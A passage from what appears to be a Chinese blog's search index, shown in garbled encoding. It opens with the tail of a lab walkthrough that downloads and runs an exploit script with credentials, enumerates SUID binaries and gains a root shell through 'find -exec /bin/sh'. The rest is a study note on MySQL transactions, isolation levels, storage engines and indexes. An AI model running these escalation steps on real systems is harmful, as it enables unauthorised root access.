é¶æœºç«¯ä¸‹è½½ wget http://192.168.56.101/34992.py é¶æœºç«¯è¿è¡Œ python 34992.py -t http://192.168.56.103/ -u hack -p root ç›´æ¥ä½¿ç”¨hack ç™»å½• ææƒä½¿ç”¨findæ‰¾ä¸‹å…·æœ‰rootæƒé™çš„suid find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -print 2&gt;/dev/null # è¿™å¥ä¹Ÿå¯ä»¥ å¯ä»¥å‘ç°findå‘½ä»¤å¯ä»¥ç”¨æ¥ææƒ å°è¯•ä½¿ç”¨findæ‰§è¡Œå‘½ä»¤ find / -name flag4 -exec &quot;whoami&quot; \\; # æ³¨æ„è¿™é‡Œçš„-name åçš„å‚æ•°éœ€è¦æ˜¯å­˜åœ¨çš„æ–‡ä»¶ è¿™é‡Œæ‰§è¡Œçš„ç»“æœå¯ä»¥çœ‹å‡ºfindæ˜¯å¯ä»¥ææƒçš„ è·å–flagç›´æ¥ä½¿ç”¨æ‰§è¡Œ /bin/sh find / -name flag4 -exec &quot;/bin/sh&quot; \\;","tags":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://sunzhengyu99.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"MySqlè¿›é˜¶å­¦ä¹ ","date":"2022-09-27T07:00:21.000Z","path":"2022/09/27/mysql/","text":"Mysqlè¿›é˜¶å­¦ä¹ äº‹åŠ¡ äº‹åŠ¡ æ˜¯ä¸€ç»„æ“ä½œçš„é›†åˆï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¼šæŠŠæ‰€æœ‰çš„æ“ä½œä½œä¸ºä¸€ä¸ªæ•´ä½“ä¸€èµ·å‘ç³» ç»Ÿæäº¤æˆ–æ’¤é”€æ“ä½œè¯·æ±‚ï¼Œå³è¿™äº›æ“ä½œè¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚ å°±æ¯”å¦‚: å¼ ä¸‰ç»™æå››è½¬è´¦1000å—é’±ï¼Œå¼ ä¸‰é“¶è¡Œè´¦æˆ·çš„é’±å‡å°‘1000ï¼Œè€Œæå››é“¶è¡Œè´¦æˆ·çš„é’±è¦å¢åŠ  1000ã€‚ è¿™ä¸€ç»„æ“ä½œå°±å¿…é¡»åœ¨ä¸€ä¸ªäº‹åŠ¡çš„èŒƒå›´å†…ï¼Œè¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ã€‚ æ•°æ®çš„å‡†å¤‡ drop table if exists account; create table account ( id int primary key AUTO_INCREMENT comment &#39;ID&#39;, name varchar(10) comment &#39;å§“å&#39;, money double(10, 2) comment &#39;ä½™é¢&#39; ) comment &#39;è´¦æˆ·è¡¨&#39;; insert into account(name, money) VALUES (&#39;å¼ ä¸‰&#39;, 2000), (&#39;æå››&#39;, 2000); æ­£å¸¸çš„æ“ä½œä¸‹è¡¨æ•°æ®çš„å˜åŒ– select * from account; select * from account where name &#x3D; &#39;å¼ ä¸‰&#39;; update account set money &#x3D; money - 1000 where id &#x3D; 1; update account set money &#x3D; money + 1000 where id &#x3D; 2; æ“ä½œå¼‚å¸¸æƒ…å†µä¸‹çš„æ•°æ®æƒ…å†µ update account set money &#x3D; money - 1000 where id &#x3D; 1; error update account set money &#x3D; money + 1000 where id &#x3D; 2; åœ¨æ­¤æƒ…å†µä¸‹ï¼Œç¬¬äºŒå¥sqlæ— æ³•æ‰§è¡Œåˆ° è¿™æ ·å°±ä¼šå¯¼è‡´å¼ ä¸‰ç”¨æˆ·è´¦æˆ·çš„é’±å°‘äº†ï¼Œä½†æ˜¯æå››è´¦å·å¹¶æ²¡æœ‰æ”¶åˆ°é’±ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°é—®é¢˜ã€‚ æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡1).æŸ¥çœ‹/è®¾ç½®äº‹åŠ¡æäº¤æ–¹å¼ select @@autocommit; set @@autocommit &#x3D; 0; 2).æäº¤äº‹åŠ¡ commit; 3).äº‹åŠ¡å›æ»š rollback; ä¸Šé¢çš„è¿‡ç¨‹æ˜¯å°†äº‹åŠ¡çš„æäº¤è®¾ç½®ä¸ºæ‰‹åŠ¨æäº¤ï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰§è¡Œçš„DMLè¯­å¥éƒ½ä¸ä¼šæäº¤, éœ€è¦æ‰‹åŠ¨çš„æ‰§è¡Œcommitè¿›è¡Œæäº¤ã€‚ è‡ªåŠ¨æ§åˆ¶äº‹åŠ¡1).å¼€å¯äº‹åŠ¡ statr&#x2F;begin tranaction 2).æäº¤äº‹åŠ¡ commitï¼› 3).äº‹åŠ¡å›æ»š rollbock; è½¬è´¦æ¡ˆä¾‹å®ç° start transaction; -- ä»å¼ ä¸‰è´¦æˆ·ä¸­è½¬å‡ºé’± update account set money &#x3D; money - 1000 where id &#x3D; 1; -- å‘æå››è´¦å·ä¸­è½¬å…¥é’± update account set money &#x3D; money + 1000 where id &#x3D; 2; -- æ‰§è¡Œå®Œæ¯•ï¼Œæäº¤äº‹åŠ¡ commit; äº‹åŠ¡å››å¤§ç‰¹æ€§ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡æ˜¯ä¸å¯åˆ†å‰²çš„æœ€å°æ“ä½œå•å…ƒï¼Œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å®Œæˆæ—¶ï¼Œå¿…é¡»ä½¿æ‰€æœ‰çš„æ•°æ®éƒ½ä¿æŒä¸€è‡´çŠ¶æ€ã€‚ éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šæ•°æ®åº“ç³»ç»Ÿæä¾›çš„éš”ç¦»æœºåˆ¶ï¼Œä¿è¯äº‹åŠ¡åœ¨ä¸å—å¤–éƒ¨å¹¶å‘æ“ä½œå½±å“çš„ç‹¬ç«‹ ç¯å¢ƒä¸‹è¿è¡Œã€‚ æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡ä¸€æ—¦æäº¤æˆ–å›æ»šï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…çš„ã€‚ ä¸Šè¿°å°±æ˜¯äº‹åŠ¡çš„å››å¤§ç‰¹æ€§ï¼Œç®€ç§°ACIDã€‚ å¹¶å‘äº‹åŠ¡äº§ç”Ÿçš„é—®é¢˜1). èµƒè¯»ï¼šä¸€ä¸ªäº‹åŠ¡è¯»åˆ°å¦å¤–ä¸€ä¸ªäº‹åŠ¡è¿˜æ²¡æœ‰æäº¤çš„æ•°æ® 2). ä¸å¯é‡å¤è¯»ï¼šä¸€ä¸ªäº‹åŠ¡å…ˆåè¯»å–åŒä¸€æ¡è®°å½•ï¼Œä½†ä¸¤æ¬¡è¯»å–çš„æ•°æ®ä¸åŒï¼Œç§°ä¹‹ä¸ºä¸å¯é‡å¤è¯»ã€‚ 3). å¹»è¯»ï¼šä¸€ä¸ªäº‹åŠ¡æŒ‰ç…§æ¡ä»¶æŸ¥è¯¢æ•°æ®æ—¶ï¼Œæ²¡æœ‰å¯¹åº”çš„æ•°æ®è¡Œï¼Œä½†æ˜¯åœ¨æ’å…¥æ•°æ®æ—¶ï¼Œåˆå‘ç°è¿™è¡Œæ•°æ® å·²ç»å­˜åœ¨ï¼Œå¥½åƒå‡ºç°äº† â€œå¹»å½±â€ã€‚ äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ä¸ºäº†è§£å†³äº‹åŠ¡å¹¶å‘äº§ç”Ÿçš„é—®é¢˜ï¼Œåœ¨æ•°æ®åº“ä¸­å¼•å…¥äº†äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š éš”ç¦»çº§åˆ« è„è¯» ä¸å¯é‡å¤åº¦ å¹»è¯» Read uncommited(è¯»æœªæäº¤) âˆš âˆš âˆš Read commited(è¯»å·²æäº¤) Ã— âˆš âˆš Repeatable Read(é»˜è®¤) Ã— Ã— âˆš Serializable(ä¸²è¡ŒåŒ–) Ã— Ã— Ã— 1). æŸ¥çœ‹äº‹åŠ¡çš„éš”ç¦»çº§åˆ« SELECT @@TRANSACTION_ISOLATION; Mysqlé»˜è®¤ä½¿ç”¨çš„æ˜¯Repeatable Read 2).è®¾ç½®äº‹åŠ¡éš”ç¦»çº§åˆ« SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123; READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125; -- sessionæ˜¯è®¾ç½®å½“å‰ä¼šè¯å³å½“å‰è¿æ¥çš„ç»ˆç«¯çš„éš”ç¦»çº§åˆ« -- GLOBALæ˜¯è®¾ç½®æ‰€æœ‰ä¼šè¯çš„éš”ç¦»çº§åˆ« æ³¨æ„ï¼šäº‹åŠ¡çš„éš”ç¦»çº§åˆ«è¶Šé«˜å…¶æ€§èƒ½è¶Šä½ å­˜å‚¨å¼•æ“æŸ¥çœ‹å½“å‰æ•°æ®åº“æ”¯æŒçš„å­˜å‚¨å¼•æ“ show engines å½“åˆ›å»ºè¡¨æ—¶é»˜è®¤ä½¿ç”¨InnoDBå­˜å‚¨å¼•æ“ show create table tb_user; åˆ›å»ºæ•°æ®è¡¨æ—¶æŒ‡å®šæ•°æ®å¼•æ“ï¼Œæ·»åŠ å‚æ•°engine=å­˜å‚¨å¼•æ“å create table my_myisam ( id int, name varchar(10) ) engine &#x3D; MyISAM; create table my_myisam ( id int, name varchar(10) ) engine &#x3D; Memory; InnoDB1). ä»‹ç» InnoDBæ˜¯ä¸€ç§å…¼é¡¾é«˜å¯é æ€§å’Œé«˜æ€§èƒ½çš„é€šç”¨å­˜å‚¨å¼•æ“ï¼Œåœ¨ MySQL 5.5 ä¹‹åï¼ŒInnoDBæ˜¯é»˜è®¤çš„MySQL å­˜å‚¨å¼•æ“ã€‚ 2). ç‰¹ç‚¹ DMLæ“ä½œéµå¾ªACIDæ¨¡å‹ï¼Œæ”¯æŒäº‹åŠ¡ï¼› è¡Œçº§é”ï¼Œæé«˜å¹¶å‘è®¿é—®æ€§èƒ½ï¼› æ”¯æŒå¤–é”®FOREIGN KEYçº¦æŸï¼Œä¿è¯æ•°æ®çš„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§ï¼› 3).é€»è¾‘å­˜å‚¨ç»“æ„ MyISAM1). ä»‹ç» MyISAMæ˜¯MySQLæ—©æœŸçš„é»˜è®¤å­˜å‚¨å¼•æ“ã€‚ 2). ç‰¹ç‚¹ ä¸æ”¯æŒäº‹åŠ¡ï¼Œä¸æ”¯æŒå¤–é”® æ”¯æŒè¡¨é”ï¼Œä¸æ”¯æŒè¡Œé” è®¿é—®é€Ÿåº¦å¿« Memory1). ä»‹ç» Memoryå¼•æ“çš„è¡¨æ•°æ®æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œç”±äºå—åˆ°ç¡¬ä»¶é—®é¢˜ã€æˆ–æ–­ç”µé—®é¢˜çš„å½±å“ï¼Œåªèƒ½å°†è¿™äº›è¡¨ä½œä¸ºä¸´æ—¶è¡¨æˆ–ç¼“å­˜ä½¿ç”¨ã€‚ 2). ç‰¹ç‚¹ å†…å­˜å­˜æ”¾ hashç´¢å¼•ï¼ˆé»˜è®¤ï¼‰ é¢è¯•é¢˜: InnoDBå¼•æ“ä¸MyISAMå¼•æ“çš„åŒºåˆ« ? â‘ . InnoDBå¼•æ“, æ”¯æŒäº‹åŠ¡, è€ŒMyISAMä¸æ”¯æŒã€‚ â‘¡. InnoDBå¼•æ“, æ”¯æŒè¡Œé”å’Œè¡¨é”, è€ŒMyISAMä»…æ”¯æŒè¡¨é”, ä¸æ”¯æŒè¡Œé”ã€‚ â‘¢. InnoDBå¼•æ“, æ”¯æŒå¤–é”®, è€ŒMyISAMæ˜¯ä¸æ”¯æŒçš„ã€‚ ä¸»è¦æ˜¯ä¸Šè¿°ä¸‰ç‚¹åŒºåˆ«ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä»ç´¢å¼•ç»“æ„ã€å­˜å‚¨é™åˆ¶ç­‰æ–¹é¢ï¼Œæ›´åŠ æ·±å…¥çš„å›ç­”ï¼Œå…·ä½“å‚ è€ƒå¦‚ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html å­˜å‚¨å¼•æ“çš„é€‰æ‹© åœ¨é€‰æ‹©å­˜å‚¨å¼•æ“æ—¶ï¼Œåº”è¯¥æ ¹æ®åº”ç”¨ç³»ç»Ÿçš„ç‰¹ç‚¹é€‰æ‹©åˆé€‚çš„å­˜å‚¨å¼•æ“ã€‚ InnDB:æ˜¯mysqlçš„é»˜è®¤å­˜å‚¨å¼•æ“ï¼Œæ”¯æŒäº‹åŠ¡ã€å¤–é”®ã€‚å¦‚æœåº”ç”¨å¯¹äº‹åŠ¡çš„å®Œæ•´æ€§è¦æ±‚æ¯”è¾ƒé«˜ï¼Œåœ¨å¹¶å‘æ¡ä»¶ä¸‹è¦æ±‚æ•°æ®çš„ä¸€è‡´æ€§çš„æƒ…å†µä¸‹åº”è¯¥é€‰æ‹©æ­¤å­˜å‚¨å¼•æ“ã€‚ MyISAM: å¦‚æœåº”ç”¨æ˜¯ä»¥è¯»å–å’Œæ’å…¥æ“ä½œä¸ºä¸» ï¼Œåªæœ‰å°‘é‡çš„åˆ é™¤å’Œæ›´æ–°æ“ä½œï¼Œå¹¶ä¸”å¯¹äº‹åŠ¡çš„å®Œæ•´æ€§ï¼Œå¹¶å‘æ€§è¦æ±‚ä¸æ˜¯å¾ˆé«˜ï¼Œé‚£ä¹ˆé€‰æ‹©æ­¤å­˜å‚¨å¼•æ“åˆé€‚ Memory: å°†æ‰€æœ‰æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œ è®¿é—®é€Ÿåº¦å¿«ï¼Œé€šå¸¸ç”¨äºä¸´æ—¶è¡¨å’Œç¼“å­˜ã€‚ä½†æ˜¯ç”±äºå­˜æ”¾åœ¨å†…å­˜ä¸­å…¶å—åˆ°çš„é™åˆ¶ä¹Ÿå¾ˆå¤šï¼Œå¦‚è¡¨çš„å¤§å°é™åˆ¶ï¼Œæ— æ³•å¯¹è¿‡å¤§çš„è¡¨è¿›è¡Œç¼“å­˜ï¼Œè¿˜æœ‰å®‰å…¨æ€§é—®é¢˜ï¼Œå¦‚æ–­ç”µæ—¶æ•°æ®ä¸¢å¤±ã€‚ ç´¢å¼•ä»‹ç» ç´¢å¼•ï¼ˆindexï¼‰æ˜¯å¸®åŠ©MySQLé«˜æ•ˆè·å–æ•°æ®çš„æ•°æ®ç»“æ„(æœ‰åº)ã€‚åœ¨æ•°æ®ä¹‹å¤–ï¼Œæ•°æ®åº“ç³»ç»Ÿè¿˜ç»´æŠ¤ç€æ»¡è¶³ ç‰¹å®šæŸ¥æ‰¾ç®—æ³•çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›æ•°æ®ç»“æ„ä»¥æŸç§æ–¹å¼å¼•ç”¨ï¼ˆæŒ‡å‘ï¼‰æ•°æ®ï¼Œ è¿™æ ·å°±å¯ä»¥åœ¨è¿™äº›æ•°æ®ç»“æ„ ä¸Šå®ç°é«˜çº§æŸ¥æ‰¾ç®—æ³•ï¼Œè¿™ç§æ•°æ®ç»“æ„å°±æ˜¯ç´¢å¼•ã€‚ ç´¢å¼•ç»“æ„MySQLçš„ç´¢å¼•æ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚å®ç°çš„ï¼Œä¸åŒçš„å­˜å‚¨å¼•æ“æœ‰ä¸åŒçš„ç´¢å¼•ç»“æ„ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ç§ï¼š ç´¢å¼•ç»“æ„ æè¿° B+tree æœ€å¸¸è§çš„ç´¢å¼•ç±»å‹ï¼Œå¤§éƒ¨åˆ†å¼•æ“éƒ½æ”¯æŒ B+ æ ‘ç´¢å¼• Hashç´¢å¼• åº•å±‚æ•°æ®ç»“æ„æ˜¯ç”¨å“ˆå¸Œè¡¨å®ç°çš„, åªæœ‰ç²¾ç¡®åŒ¹é…ç´¢å¼•åˆ—çš„æŸ¥è¯¢æ‰æœ‰æ•ˆ, ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢ R-tree(ç©ºé—´ç´¢å¼•ï¼‰ ç©ºé—´ç´¢å¼•æ˜¯MyISAMå¼•æ“çš„ä¸€ä¸ªç‰¹æ®Šç´¢å¼•ç±»å‹ï¼Œä¸»è¦ç”¨äºåœ°ç†ç©ºé—´æ•°æ®ç±»å‹ï¼Œé€šå¸¸ä½¿ç”¨è¾ƒå°‘ Full-text(å…¨æ–‡ç´¢å¼•) æ˜¯ä¸€ç§é€šè¿‡å»ºç«‹å€’æ’ç´¢å¼•,å¿«é€ŸåŒ¹é…æ–‡æ¡£çš„æ–¹å¼ã€‚ç±»ä¼¼äºLucene,Solr,ES å­˜å‚¨å¼•æ“å¯¹äºç´¢å¼•ç»“æ„çš„æ”¯æŒæƒ…å†µ ç´¢å¼• InnoDB MyISAM Memory B+tree æ”¯æŒ æ”¯æŒ æ”¯æŒ Hashç´¢å¼• ä¸æ”¯æŒ ä¸æ”¯æŒ æ”¯æŒ R-tree ä¸æ”¯æŒ æ”¯æŒ ä¸æ”¯æŒ Full-text 5.6ç‰ˆæœ¬ä¹‹åæ”¯æŒ æ”¯æŒ ä¸æ”¯æŒ B-tree B-Treeï¼ŒBæ ‘æ˜¯ä¸€ç§å¤šå‰è·¯è¡¡æŸ¥æ‰¾æ ‘ï¼Œç›¸å¯¹äºäºŒå‰æ ‘ï¼ŒBæ ‘æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªåˆ†æ”¯ï¼Œå³å¤šå‰ã€‚ä»¥ä¸€é¢—æœ€å¤§åº¦æ•°ï¼ˆmax-degreeï¼‰ä¸º5(5é˜¶)çš„b-treeä¸ºä¾‹ï¼Œé‚£è¿™ä¸ªBæ ‘æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šå­˜å‚¨4ä¸ªkeyï¼Œ5ä¸ªæŒ‡é’ˆ B+Tree B+Treeæ˜¯B-Treeçš„å˜ç§ï¼Œæˆ‘ä»¬ä»¥ä¸€é¢—æœ€å¤§åº¦æ•°ï¼ˆmax-degreeï¼‰ä¸º4ï¼ˆ4é˜¶ï¼‰çš„b+treeä¸ºä¾‹ï¼Œå…¶ç»“æ„ç¤ºæ„å›¾ï¼š ç»¿è‰²æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†ï¼Œæ˜¯ç´¢å¼•éƒ¨åˆ†ï¼Œä»…ä»…èµ·åˆ°ç´¢å¼•æ•°æ®çš„ä½œç”¨ï¼Œä¸å­˜å‚¨æ•°æ®ã€‚ çº¢è‰²æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†ï¼Œæ˜¯æ•°æ®å­˜å‚¨éƒ¨åˆ†ï¼Œåœ¨å…¶å¶å­èŠ‚ç‚¹ä¸­è¦å­˜å‚¨å…·ä½“çš„æ•°æ®ã€‚ B+Tree ä¸ B-Treeç›¸æ¯”ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç‚¹åŒºåˆ«ï¼š æ‰€æœ‰çš„æ•°æ®éƒ½ä¼šå‡ºç°åœ¨å¶å­èŠ‚ç‚¹ã€‚ å¶å­èŠ‚ç‚¹å½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ã€‚ éå¶å­èŠ‚ç‚¹ä»…ä»…èµ·åˆ°ç´¢å¼•æ•°æ®ä½œç”¨ï¼Œå…·ä½“çš„æ•°æ®éƒ½æ˜¯åœ¨å¶å­èŠ‚ç‚¹å­˜æ”¾çš„ã€‚ MySQLç´¢å¼•æ•°æ®ç»“æ„å¯¹ç»å…¸çš„B+Treeè¿›è¡Œäº†ä¼˜åŒ–ã€‚åœ¨åŸB+Treeçš„åŸºç¡€ä¸Šï¼Œå¢åŠ ä¸€ä¸ªæŒ‡å‘ç›¸é‚»å¶å­èŠ‚ç‚¹ çš„é“¾è¡¨æŒ‡é’ˆï¼Œå°±å½¢æˆäº†å¸¦æœ‰é¡ºåºæŒ‡é’ˆçš„B+Treeï¼Œæé«˜åŒºé—´è®¿é—®çš„æ€§èƒ½ï¼Œåˆ©äºæ’åºã€‚ Hashç´¢å¼•å“ˆå¸Œç´¢å¼•å°±æ˜¯é‡‡ç”¨ä¸€å®šçš„hashç®—æ³•ï¼Œå°†é”®å€¼æ¢ç®—æˆæ–°çš„hashå€¼ï¼Œæ˜ å°„åˆ°å¯¹åº”çš„æ§½ä½ä¸Šï¼Œç„¶åå­˜å‚¨åœ¨hashè¡¨ä¸­ã€‚Javaä¸­çš„HashMapç»“æ„ç±»ä¼¼(æ ‘åŠ é“¾è¡¨çš„å®ç°æ–¹å¼)ã€‚å¦‚æœä¸¤ä¸ª(æˆ–å¤šä¸ª)é”®å€¼ï¼Œæ˜ å°„åˆ°ä¸€ä¸ªç›¸åŒçš„æ§½ä½ä¸Šï¼Œä»–ä»¬å°±äº§ç”Ÿäº†hashå†²çªï¼ˆä¹Ÿç§°ä¸ºhashç¢°æ’ï¼‰ï¼Œå¯ä»¥é€šè¿‡é“¾è¡¨æ¥è§£å†³ã€‚ ç‰¹ç‚¹ Hashç´¢å¼•åªèƒ½ç”¨äºå¯¹ç­‰æ¯”è¾ƒ(=ï¼Œin)ï¼Œä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢ï¼ˆbetweenï¼Œ&gt;ï¼Œ&lt; ï¼Œâ€¦ï¼‰ æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆæ’åºæ“ä½œ æŸ¥è¯¢æ•ˆç‡é«˜ï¼Œé€šå¸¸(ä¸å­˜åœ¨hashå†²çªçš„æƒ…å†µ)åªéœ€è¦ä¸€æ¬¡æ£€ç´¢å°±å¯ä»¥äº†ï¼Œæ•ˆç‡é€šå¸¸è¦é«˜äºB+treeç´¢ å¼• ä¸ºä»€ä¹ˆInnDBé€‰æ‹©B+Treeä½œä¸ºç´¢å¼•ç»“æ„ ç›¸æ¯”è¾ƒäºŒå‰æ ‘ï¼Œå…¶å±‚çº§æ›´å°‘ï¼Œæœç´¢æ•ˆç‡æ›´é«˜ äºB-treeï¼Œæ— è®ºæ˜¯å¶å­èŠ‚ç‚¹è¿˜æ˜¯éå¶å­èŠ‚ç‚¹ï¼Œéƒ½ä¼šä¿å­˜æ•°æ®ï¼Œè¿™æ ·å¯¼è‡´ä¸€é¡µä¸­å­˜å‚¨çš„é”®å€¼å‡å°‘ï¼ŒæŒ‡é’ˆè·Ÿç€å‡å°‘ï¼Œè¦åŒæ ·ä¿å­˜å¤§é‡æ•°æ®ï¼Œåªèƒ½å¢åŠ æ ‘çš„é«˜åº¦ï¼Œå¯¼è‡´æ€§èƒ½é™ä½ï¼› ç›¸å¯¹Hashç´¢å¼•ï¼ŒB+treeæ”¯æŒèŒƒå›´åŒ¹é…åŠæ’åºæ“ä½œ ç´¢å¼•åˆ†ç±»åœ¨MySQLæ•°æ®åº“ï¼Œå°†ç´¢å¼•çš„å…·ä½“ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼šä¸»é”®ç´¢å¼•ã€å”¯ä¸€ç´¢å¼•ã€å¸¸è§„ç´¢å¼•ã€å…¨æ–‡ç´¢å¼•ã€‚ åˆ†ç±» å«ä¹‰ ç‰¹ç‚¹ å…³é”®å­— ä¸»é”®ç´¢å¼• é’ˆå¯¹è¡¨ä¸­ä¸»é”®åˆ›å»ºçš„ç´¢å¼• é»˜è®¤è‡ªåŠ¨åˆ›å»ºï¼Œåªèƒ½æœ‰ä¸€ä¸ª primary å”¯ä¸€ç´¢å¼• é¿å…è¡¨ä¸­æŸ æ•°æ®åˆ—çš„å€¼é‡å¤ å¯ä»¥æœ‰å¤šä¸ª UNIQUE å¸¸è§„ç´¢å¼• å¿«é€Ÿå®šä½æ•°æ® å¯ä»¥æœ‰å¤šä¸ª å…¨æ–‡ç´¢å¼• å…¨æ–‡ç´¢å¼•æŸ¥æ‰¾çš„æ˜¯æ–‡ä¸­çš„å…³é”®å­—ï¼Œè€Œä¸æ˜¯æ¯”è¾ƒç´¢å¼•çš„å€¼ å¯ä»¥æœ‰å¤šä¸ª FULLTEXT èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•InnDBå­˜å‚¨å¼•æ“ä¸­ï¼Œæ ¹æ®ç´¢å¼•çš„å­˜å‚¨å½¢å¼ï¼Œåˆå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ï¼š åˆ†ç±» å«ä¹‰ ç‰¹ç‚¹ èšé›†ç´¢å¼•(Clustered Index) å°†æ•°æ®å­˜å‚¨ä¸ç´¢å¼•æ”¾åˆ°ä¸€å—ï¼Œç´¢å¼•ç»“æ„çš„å¶å­èŠ‚ç‚¹ä¿å­˜åˆ°è¡Œæ•°æ® å¿…é¡»æœ‰ä¸”åªæœ‰ä¸€ä¸ª äºŒçº§ç´¢å¼• å°†æ•°æ®ä¸ç´¢å¼•åˆ†å¼€å­˜å‚¨ï¼Œç´¢å¼•ç»“æ„çš„å¶å­èŠ‚ç‚¹å…³è”æ˜¯å¯¹åº”çš„ä¸»é”® å¯ä»¥ å­˜æ”¾å¾ˆå¤šä¸ª èšé›†ç´¢å¼•é€‰å–è§„åˆ™ï¼š å¦‚æœå­˜åœ¨ä¸»é”®ï¼Œä¸»é”®ç´¢å¼•å°±æ˜¯èšé›†ç´¢å¼• å¦‚æœä¸å­˜åœ¨ä¸»é”®ï¼Œå°†ä½¿ç”¨ç¬¬ä¸€ä¸ªå”¯ä¸€(UNIQUE)ç´¢å¼•ä½œä¸ºèšé›†ç´¢å¼• å¦‚æœè¡¨æ²¡æœ‰ä¸»é”®ï¼Œæˆ–æ²¡æœ‰åˆé€‚çš„å”¯ä¸€ç´¢å¼•ï¼Œåˆ™InnoDBä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªrowidä½œä¸ºéšè—çš„èšé›†ç´¢å¼•ã€‚ èšé›†ç´¢å¼•ä¸äºŒçº§ç´¢å¼•çš„ç»“æ„å¦‚ä¸‹ï¼š å½“æ‰§è¡Œ select * from user where name &#x3D; &#39;Arm&#39;; é€šè¿‡äºŒçº§ç´¢å¼•è·å–åˆ°å…¶å¯¹åº”çš„ä¸»é”®ç´¢å¼•ï¼Œå†åˆ°èšé›†ç´¢å¼•ä¸­è·å–æ‰€æœ‰çš„è¡Œæ•°æ®ï¼Œè¿™ç§æŸ¥è¯¢è¿‡ç¨‹å«åšå›è¡¨æŸ¥è¯¢ã€‚ ä¸Šè¿°æŸ¥è¯¢è¯¦ç»†æŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹ï¼š ç”±äºæ˜¯æ ¹æ®nameå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥å…ˆæ ¹æ®name=â€™Armâ€™åˆ°nameå­—æ®µçš„äºŒçº§ç´¢å¼•ä¸­è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ã€‚ä½†æ˜¯åœ¨äºŒçº§ç´¢å¼•ä¸­åªèƒ½æŸ¥æ‰¾åˆ° Arm å¯¹åº”çš„ä¸»é”®å€¼ 10ã€‚ ç”±äºæŸ¥è¯¢çš„å­—æ®µæ˜¯*ï¼ŒäºŒçº§ç´¢å¼•ä¸­æ²¡æœ‰è¯¥å­—æ®µï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ ¹æ®äºŒçº§ç´¢å¼•ä¸­å­˜å‚¨çš„ä¸»é”®id = 10å»èšé›†ç´¢å¼•ä¸­æŸ¥è¯¢ æœ€åè·å–ä¸»é”®ä¸º10çš„è¡Œï¼Œè¿”å›æ‰€æœ‰æ•°æ® InnoDBå­˜å‚¨å¼•æ“æœ€å°çš„å­˜å‚¨å•å…ƒ-é¡µ(16K)ï¼Œé‚£ä¹ˆé«˜åº¦ä¸º2çš„B+treeæ ‘èƒ½å­˜å‚¨å¤šå°‘æ¡æ•°æ®ï¼Ÿ è¿™é‡Œæˆ‘ä»¬å…ˆå‡è®¾B+æ ‘é«˜ä¸º2ï¼Œå³å­˜åœ¨ä¸€ä¸ªæ ¹èŠ‚ç‚¹å’Œè‹¥å¹²ä¸ªå¶å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¿™æ£µB+æ ‘çš„å­˜æ”¾æ€»è®°å½•æ•°ä¸ºï¼šæ ¹èŠ‚ç‚¹æŒ‡é’ˆæ•°*å•ä¸ªå¶å­èŠ‚ç‚¹è®°å½•è¡Œæ•°ã€‚ 